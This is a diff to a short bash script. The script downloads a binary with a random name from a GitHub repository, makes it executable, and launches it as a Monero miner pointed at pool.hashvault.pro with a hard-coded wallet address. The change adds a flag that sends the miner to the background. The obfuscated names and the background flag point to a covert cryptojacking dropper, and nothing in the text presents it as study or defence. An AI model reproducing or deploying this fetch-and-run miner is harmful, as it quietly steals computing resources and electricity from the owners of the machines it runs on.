@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/gcbmofhwlu/pxokfjwoekx/raw/main/mbtnxklk
 chmod 744 mbtnxklk
-./mbtnxklk --url pool.hashvault.pro:80 --user 4AHnjgotTyL79cjhd2kXzb6tuYFUThRJ5J9PRwh7qfgdbeNTDVdpJiK5taWCpR38eWCHFJdmRPZX55YQ5yYg4MTqGzZL2rF --pass x --donate-level 2 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./mbtnxklk --url pool.hashvault.pro:80 --user 4AHnjgotTyL79cjhd2kXzb6tuYFUThRJ5J9PRwh7qfgdbeNTDVdpJiK5taWCpR38eWCHFJdmRPZX55YQ5yYg4MTqGzZL2rF --pass x --donate-level 2 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -B
